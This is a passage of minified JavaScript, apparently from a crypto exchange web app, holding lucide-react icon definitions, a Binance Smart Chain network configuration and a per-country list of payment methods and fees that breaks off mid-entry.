 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Qt = _("AlertCircle", [["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
}], ["line", {
    x1: "12",
    x2: "12",
    y1: "8",
    y2: "12",
    key: "1pkeuh"
}], ["line", {
    x1: "12",
    x2: "12.01",
    y1: "16",
    y2: "16",
    key: "4dfq90"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Ki = _("AlertTriangle", [["path", {
    d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z",
    key: "c3ski4"
}], ["path", {
    d: "M12 9v4",
    key: "juzpu7"
}], ["path", {
    d: "M12 17h.01",
    key: "p32p05"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Gr = _("ArrowRight", [["path", {
    d: "M5 12h14",
    key: "1ays0h"
}], ["path", {
    d: "m12 5 7 7-7 7",
    key: "xquz4c"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const yc = _("Award", [["circle", {
    cx: "12",
    cy: "8",
    r: "6",
    key: "1vp47v"
}], ["path", {
    d: "M15.477 12.89 17 22l-5-3-5 3 1.523-9.11",
    key: "em7aur"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Hs = _("BadgeCheck", [["path", {
    d: "M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z",
    key: "3c2336"
}], ["path", {
    d: "m9 12 2 2 4-4",
    key: "dzmm74"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const sf = _("BarChart3", [["path", {
    d: "M3 3v18h18",
    key: "1s2lah"
}], ["path", {
    d: "M18 17V9",
    key: "2bz60n"
}], ["path", {
    d: "M13 17V5",
    key: "1frdt8"
}], ["path", {
    d: "M8 17v-3",
    key: "17ska0"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const of = _("Building", [["rect", {
    width: "16",
    height: "20",
    x: "4",
    y: "2",
    rx: "2",
    ry: "2",
    key: "76otgf"
}], ["path", {
    d: "M9 22v-4h6v4",
    key: "r93iot"
}], ["path", {
    d: "M8 6h.01",
    key: "1dz90k"
}], ["path", {
    d: "M16 6h.01",
    key: "1x0f13"
}], ["path", {
    d: "M12 6h.01",
    key: "1vi96p"
}], ["path", {
    d: "M12 10h.01",
    key: "1nrarc"
}], ["path", {
    d: "M12 14h.01",
    key: "1etili"
}], ["path", {
    d: "M16 10h.01",
    key: "1m94wz"
}], ["path", {
    d: "M16 14h.01",
    key: "1gbofw"
}], ["path", {
    d: "M8 10h.01",
    key: "19clt8"
}], ["path", {
    d: "M8 14h.01",
    key: "6423bh"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const tt = _("CheckCircle", [["path", {
    d: "M22 11.08V12a10 10 0 1 1-5.93-9.14",
    key: "g774vq"
}], ["path", {
    d: "m9 11 3 3L22 4",
    key: "1pflzl"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const vc = _("Check", [["path", {
    d: "M20 6 9 17l-5-5",
    key: "1gmf2c"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Ho = _("ChevronDown", [["path", {
    d: "m6 9 6 6 6-6",
    key: "qrunsl"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const lf = _("ChevronRight", [["path", {
    d: "m9 18 6-6-6-6",
    key: "mthhwq"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const im = _("Clock", [["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
}], ["polyline", {
    points: "12 6 12 12 16 14",
    key: "68esgv"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const qr = _("CreditCard", [["rect", {
    width: "20",
    height: "14",
    x: "2",
    y: "5",
    rx: "2",
    key: "ynyp8z"
}], ["line", {
    x1: "2",
    x2: "22",
    y1: "10",
    y2: "10",
    key: "1b3vmo"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const _i = _("Database", [["ellipse", {
    cx: "12",
    cy: "5",
    rx: "9",
    ry: "3",
    key: "msslwz"
}], ["path", {
    d: "M3 5V19A9 3 0 0 0 21 19V5",
    key: "1wlel7"
}], ["path", {
    d: "M3 12A9 3 0 0 0 21 12",
    key: "mv7ke4"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Tn = _("DollarSign", [["line", {
    x1: "12",
    x2: "12",
    y1: "2",
    y2: "22",
    key: "7eqyqh"
}], ["path", {
    d: "M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6",
    key: "1b0p4s"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const om = _("ExternalLink", [["path", {
    d: "M15 3h6v6",
    key: "1q9fwt"
}], ["path", {
    d: "M10 14 21 3",
    key: "gplh6r"
}], ["path", {
    d: "M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6",
    key: "a6xqqp"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Sc = _("Eye", [["path", {
    d: "M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z",
    key: "rwhkz3"
}], ["circle", {
    cx: "12",
    cy: "12",
    r: "3",
    key: "1v7zrd"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const cf = _("FileText", [["path", {
    d: "M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z",
    key: "1rqfz7"
}], ["path", {
    d: "M14 2v4a2 2 0 0 0 2 2h4",
    key: "tnqrlb"
}], ["path", {
    d: "M10 9H8",
    key: "b1mrlr"
}], ["path", {
    d: "M16 13H8",
    key: "t4e002"
}], ["path", {
    d: "M16 17H8",
    key: "z1uh3a"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Gs = _("Fingerprint", [["path", {
    d: "M2 12C2 6.5 6.5 2 12 2a10 10 0 0 1 8 4",
    key: "1jc9o5"
}], ["path", {
    d: "M5 19.5C5.5 18 6 15 6 12c0-.7.12-1.37.34-2",
    key: "1mxgy1"
}], ["path", {
    d: "M17.29 21.02c.12-.6.43-2.3.5-3.02",
    key: "ptglia"
}], ["path", {
    d: "M12 10a2 2 0 0 0-2 2c0 1.02-.1 2.51-.26 4",
    key: "1nerag"
}], ["path", {
    d: "M8.65 22c.21-.66.45-1.32.57-2",
    key: "13wd9y"
}], ["path", {
    d: "M14 13.12c0 2.38 0 6.38-1 8.88",
    key: "o46ks0"
}], ["path", {
    d: "M2 16h.01",
    key: "1gqxmh"
}], ["path", {
    d: "M21.8 16c.2-2 .131-5.354 0-6",
    key: "drycrb"
}], ["path", {
    d: "M9 6.8a6 6 0 0 1 9 5.2c0 .47 0 1.17-.02 2",
    key: "1fgabc"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Me = _("Globe", [["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
}], ["path", {
    d: "M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20",
    key: "13o1zl"
}], ["path", {
    d: "M2 12h20",
    key: "9i4pu4"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const uf = _("Heart", [["path", {
    d: "M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z",
    key: "c3ymky"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const df = _("Layers", [["path", {
    d: "m12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83Z",
    key: "8b97xw"
}], ["path", {
    d: "m22 17.65-9.17 4.16a2 2 0 0 1-1.66 0L2 17.65",
    key: "dd6zsq"
}], ["path", {
    d: "m22 12.65-9.17 4.16a2 2 0 0 1-1.66 0L2 12.65",
    key: "ep9fru"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const wr = _("Loader", [["line", {
    x1: "12",
    x2: "12",
    y1: "2",
    y2: "6",
    key: "gza1u7"
}], ["line", {
    x1: "12",
    x2: "12",
    y1: "18",
    y2: "22",
    key: "1qhbu9"
}], ["line", {
    x1: "4.93",
    x2: "7.76",
    y1: "4.93",
    y2: "7.76",
    key: "xae44r"
}], ["line", {
    x1: "16.24",
    x2: "19.07",
    y1: "16.24",
    y2: "19.07",
    key: "bxnmvf"
}], ["line", {
    x1: "2",
    x2: "6",
    y1: "12",
    y2: "12",
    key: "89khin"
}], ["line", {
    x1: "18",
    x2: "22",
    y1: "12",
    y2: "12",
    key: "pb8tfm"
}], ["line", {
    x1: "4.93",
    x2: "7.76",
    y1: "19.07",
    y2: "16.24",
    key: "1uxjnu"
}], ["line", {
    x1: "16.24",
    x2: "19.07",
    y1: "7.76",
    y2: "4.93",
    key: "6duxfx"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const lm = _("Lock", [["rect", {
    width: "18",
    height: "11",
    x: "3",
    y: "11",
    rx: "2",
    ry: "2",
    key: "1w4ew1"
}], ["path", {
    d: "M7 11V7a5 5 0 0 1 10 0v4",
    key: "fwvmzm"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const xa = _("Mail", [["rect", {
    width: "20",
    height: "16",
    x: "2",
    y: "4",
    rx: "2",
    key: "18n3k1"
}], ["path", {
    d: "m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7",
    key: "1ocrg3"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const mf = _("MapPin", [["path", {
    d: "M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z",
    key: "2oe9fu"
}], ["circle", {
    cx: "12",
    cy: "10",
    r: "3",
    key: "ilqhr7"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const qs = _("MessageCircle", [["path", {
    d: "M7.9 20A9 9 0 1 0 4 16.1L2 22Z",
    key: "vv11sd"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const hf = _("Moon", [["path", {
    d: "M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z",
    key: "a7tn18"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const wc = _("Newspaper", [["path", {
    d: "M4 22h16a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2H8a2 2 0 0 0-2 2v16a2 2 0 0 1-2 2Zm0 0a2 2 0 0 1-2-2v-9c0-1.1.9-2 2-2h2",
    key: "7pis2x"
}], ["path", {
    d: "M18 14h-8",
    key: "sponae"
}], ["path", {
    d: "M15 18h-5",
    key: "95g1m2"
}], ["path", {
    d: "M10 6h8v4h-8V6Z",
    key: "smlsk5"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const br = _("Phone", [["path", {
    d: "M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z",
    key: "foiqr5"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const pf = _("Quote", [["path", {
    d: "M3 21c3 0 7-1 7-8V5c0-1.25-.756-2.017-2-2H4c-1.25 0-2 .75-2 1.972V11c0 1.25.75 2 2 2 1 0 1 0 1 1v1c0 1-1 2-2 2s-1 .008-1 1.031V20c0 1 0 1 1 1z",
    key: "4rm80e"
}], ["path", {
    d: "M15 21c3 0 7-1 7-8V5c0-1.25-.757-2.017-2-2h-4c-1.25 0-2 .75-2 1.972V11c0 1.25.75 2 2 2h.75c0 2.25.25 4-2.75 4v3c0 1 0 1 1 1z",
    key: "10za9r"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const ff = _("RefreshCw", [["path", {
    d: "M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8",
    key: "v9h5vc"
}], ["path", {
    d: "M21 3v5h-5",
    key: "1q7to0"
}], ["path", {
    d: "M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16",
    key: "3uifl3"
}], ["path", {
    d: "M8 16H3v5",
    key: "1cv678"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const xf = _("Scale", [["path", {
    d: "m16 16 3-8 3 8c-.87.65-1.92 1-3 1s-2.13-.35-3-1Z",
    key: "7g6ntu"
}], ["path", {
    d: "m2 16 3-8 3 8c-.87.65-1.92 1-3 1s-2.13-.35-3-1Z",
    key: "ijws7r"
}], ["path", {
    d: "M7 21h10",
    key: "1b0cd5"
}], ["path", {
    d: "M12 3v18",
    key: "108xh3"
}], ["path", {
    d: "M3 7h2c2 0 5-1 7-2 2 1 5 2 7 2h2",
    key: "3gwbw2"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Fn = _("Shield", [["path", {
    d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
    key: "oel41y"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const cm = _("Smartphone", [["rect", {
    width: "14",
    height: "20",
    x: "5",
    y: "2",
    rx: "2",
    ry: "2",
    key: "1yt0o3"
}], ["path", {
    d: "M12 18h.01",
    key: "mhygvu"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const ir = _("Star", [["polygon", {
    points: "12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2",
    key: "8f66p6"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const gf = _("Sun", [["circle", {
    cx: "12",
    cy: "12",
    r: "4",
    key: "4exip2"
}], ["path", {
    d: "M12 2v2",
    key: "tus03m"
}], ["path", {
    d: "M12 20v2",
    key: "1lh1kg"
}], ["path", {
    d: "m4.93 4.93 1.41 1.41",
    key: "149t6j"
}], ["path", {
    d: "m17.66 17.66 1.41 1.41",
    key: "ptbguv"
}], ["path", {
    d: "M2 12h2",
    key: "1t8f8n"
}], ["path", {
    d: "M20 12h2",
    key: "1q8mjw"
}], ["path", {
    d: "m6.34 17.66-1.41 1.41",
    key: "1m8zz5"
}], ["path", {
    d: "m19.07 4.93-1.41 1.41",
    key: "1shlcs"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Ra = _("TrendingUp", [["polyline", {
    points: "22 7 13.5 15.5 8.5 10.5 2 17",
    key: "126l90"
}], ["polyline", {
    points: "16 7 22 7 22 13",
    key: "kwv8wd"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const yf = _("User", [["path", {
    d: "M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",
    key: "975kel"
}], ["circle", {
    cx: "12",
    cy: "7",
    r: "4",
    key: "17ys0d"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const ps = _("Users", [["path", {
    d: "M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",
    key: "1yyitq"
}], ["circle", {
    cx: "9",
    cy: "7",
    r: "4",
    key: "nufk8"
}], ["path", {
    d: "M22 21v-2a4 4 0 0 0-3-3.87",
    key: "kshegd"
}], ["path", {
    d: "M16 3.13a4 4 0 0 1 0 7.75",
    key: "1da9ce"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const pt = _("Wallet", [["path", {
    d: "M21 12V7H5a2 2 0 0 1 0-4h14v4",
    key: "195gfw"
}], ["path", {
    d: "M3 5v14a2 2 0 0 0 2 2h16v-5",
    key: "195n9w"
}], ["path", {
    d: "M18 12a2 2 0 0 0 0 4h4v-4Z",
    key: "vllfpd"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const vf = _("Wifi", [["path", {
    d: "M12 20h.01",
    key: "zekei9"
}], ["path", {
    d: "M2 8.82a15 15 0 0 1 20 0",
    key: "dnpr2z"
}], ["path", {
    d: "M5 12.859a10 10 0 0 1 14 0",
    key: "1x1e6c"
}], ["path", {
    d: "M8.5 16.429a5 5 0 0 1 7 0",
    key: "1bycff"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const fs = _("X", [["path", {
    d: "M18 6 6 18",
    key: "1bl5f8"
}], ["path", {
    d: "m6 6 12 12",
    key: "d8bk6v"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Ot = _("Zap", [["polygon", {
    points: "13 2 3 14 12 14 11 22 21 10 12 10 13 2",
    key: "45s27k"
}]])
  , Ys = {
    chainId: "0x38",
    chainName: "Binance Smart Chain Mainnet",
    nativeCurrency: {
        name: "BNB",
        symbol: "BNB",
        decimals: 18
    },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com"]
}
  , ta = [{
    code: "IN",
    name: "India",
    flag: "🇮🇳",
    region: "High Demand Region",
    methods: [{
        name: "UPI",
        instant: !0,
        fee: "0%"
    }, {
        name: "IMPS",
        instant: !0,
        fee: "1%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }]
}, {
    code: "US",
    name: "United States",
    flag: "🇺🇸",
    region: "High Demand Region",
    methods: [{
        name: "ACH",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.9%"
    }, {
        name: "Zelle",
        instant: !0,
        fee: "0.3%"
    }]
}, {
    code: "GB",
    name: "United Kingdom",
    flag: "🇬🇧",
    region: "High Demand Region",
    methods: [{
        name: "Faster Payments",
        instant: !0,
        fee: "0.2%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "CN",
    name: "China",
    flag: "🇨🇳",
    region: "High Demand Region",
    methods: [{
        name: "Alipay",
        instant: !0,
        fee: "0.8%"
    }, {
        name: "WeChat Pay",
        instant: !0,
        fee: "0.8%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }]
}, {
    code: "AU",
    name: "Australia",
    flag: "🇦🇺",
    region: "High Demand Region",
    methods: [{
        name: "PayID",
        instant: !0,
        fee: "0.3%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.4%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.7%"
    }]
}, {
    code: "UK",
    name: "United Kingdom",
    flag: "🇬🇧",
    region: "European Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }, {
        name: "SEPA",
        instant: !0,
        fee: "0.2%"
    }]
}, {
    code: "DE",
    name: "Germany",
    flag: "🇩🇪",
    region: "European Countries",
    methods: [{
        name: "SEPA",
        instant: !0,
        fee: "0.2%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "FR",
    name: "France",
    flag: "🇫🇷",
    region: "European Countries",
    methods: [{
        name: "SEPA",
        instant: !0,
        fee: "0.2%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "IT",
    name: "Italy",
    flag: "🇮🇹",
    region: "European Countries",
    methods: [{
        name: "SEPA",
        instant: !0,
        fee: "0.2%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "ES",
    name: "Spain",
    flag: "🇪🇸",
    region: "European Countries",
    methods: [{
        name: "SEPA",
        instant: !0,
        fee: "0.2%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "NL",
    name: "Netherlands",
    flag: "🇳🇱",
    region: "European Countries",
    methods: [{
        name: "SEPA",
        instant: !0,
        fee: "0.2%"
    }, {
        name: "iDEAL",
        instant: !0,
        fee: "0.3%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }]
}, {
    code: "BE",
    name: "Belgium",
    flag: "🇧🇪",
    region: "European Countries",
    methods: [{
        name: "SEPA",
        instant: !0,
        fee: "0.2%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "CH",
    name: "Switzerland",
    flag: "🇨🇭",
    region: "European Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.4%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "AT",
    name: "Austria",
    flag: "🇦🇹",
    region: "European Countries",
    methods: [{
        name: "SEPA",
        instant: !0,
        fee: "0.2%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "SE",
    name: "Sweden",
    flag: "🇸🇪",
    region: "European Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "Swish",
        instant: !0,
        fee: "0.3%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "NO",
    name: "Norway",
    flag: "🇳🇴",
    region: "European Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "Vipps",
        instant: !0,
        fee: "0.3%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "DK",
    name: "Denmark",
    flag: "🇩🇰",
    region: "European Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "MobilePay",
        instant: !0,
        fee: "0.3%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "FI",
    name: "Finland",
    flag: "🇫🇮",
    region: "European Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "IE",
    name: "Ireland",
    flag: "🇮🇪",
    region: "European Countries",
    methods: [{
        name: "SEPA",
        instant: !0,
        fee: "0.2%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "PT",
    name: "Portugal",
    flag: "🇵🇹",
    region: "European Countries",
    methods: [{
        name: "SEPA",
        instant: !0,
        fee: "0.2%"
    }, {
        name: "MB WAY",
        instant: !0,
        fee: "0.3%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }]
}, {
    code: "PL",
    name: "Poland",
    flag: "🇵🇱",
    region: "European Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "BLIK",
        instant: !0,
        fee: "0.3%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "CZ",
    name: "Czech Republic",
    flag: "🇨🇿",
    region: "European Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "HU",
    name: "Hungary",
    flag: "🇭🇺",
    region: "European Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "RO",
    name: "Romania",
    flag: "🇷🇴",
    region: "European Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "GR",
    name: "Greece",
    flag: "🇬🇷",
    region: "European Countries",
    methods: [{
        name: "SEPA",
        instant: !0,
        fee: "0.2%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "SG",
    name: "Singapore",
    flag: "🇸🇬",
    region: "Major Asian Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayNow",
        instant: !0,
        fee: "0.3%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "HK",
    name: "Hong Kong",
    flag: "🇭🇰",
    region: "Major Asian Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "FPS",
        instant: !0,
        fee: "0.3%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "JP",
    name: "Japan",
    flag: "🇯🇵",
    region: "Major Asian Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "KR",
    name: "South Korea",
    flag: "🇰🇷",
    region: "Major Asian Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
